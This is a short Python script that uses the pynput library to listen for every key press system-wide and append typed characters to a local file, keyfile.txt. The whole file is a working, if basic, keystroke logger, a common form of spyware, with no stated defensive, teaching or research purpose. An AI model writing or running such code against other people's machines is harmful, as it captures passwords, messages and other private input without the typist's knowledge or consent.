from pynput import keyboard

def keyPress(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error")    



if __name__ == "__main__":
    listener =keyboard.Listener(on_press=keyPress)
    listener.start()
    input()

     